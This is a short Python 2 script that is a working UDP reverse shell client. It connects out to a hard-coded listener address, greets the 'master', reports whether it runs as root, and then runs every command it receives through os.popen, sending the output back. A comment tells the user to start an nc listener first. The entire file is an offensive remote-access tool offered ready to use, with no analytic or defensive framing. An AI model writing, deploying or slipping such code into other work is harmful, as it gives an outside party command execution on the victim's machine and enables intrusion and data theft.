#! /usr/bin/python
import socket
import os
import sys
import platform
# prior launching the client, set up an nc listener... something like:
# nc -lvunp 10000

# change the following line to match your setup
server_address = ('192.168.56.103', 10000)

def launch():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto('hello master\n', server_address)
    return s

s = launch()
prompt = []

def getsysinfo():
    # create a nice prompt...
    if os.getuid() == 0:
        prompt.append('root@')
        prompt.append('# ')
    else:
        prompt.append('user@')  
        prompt.append('$ ')
    prompt.insert(1, platform.dist()[0])
    return


getsysinfo()
def shell():
    while 1:
        try:
            sent = s.sendto(''.join(prompt), server_address)
            command,count = s.recvfrom(1024)
            command = command.strip()
            # for debug...
            # print 'got command: ', command
            if command.strip() == '':
                continue
            if command.strip().split()[0] == 'cd':
                os.chdir(command.strip('cd '))
                s.sendto('Changed Directory\n', server_address)
            elif command.strip() == 'goodbye' or command.strip() == 'exit':
                s.sendto('Goodbye master\n', server_address)
                s.close()
                break
            else:
                proc = os.popen(command)
                output = proc.read()
                output = output.strip() + '\n'
                s.sendto(output, server_address)
            command = ''
        except Exception, e:
            s.sendto('An unexpected error has occured\n', server_address)
shell()
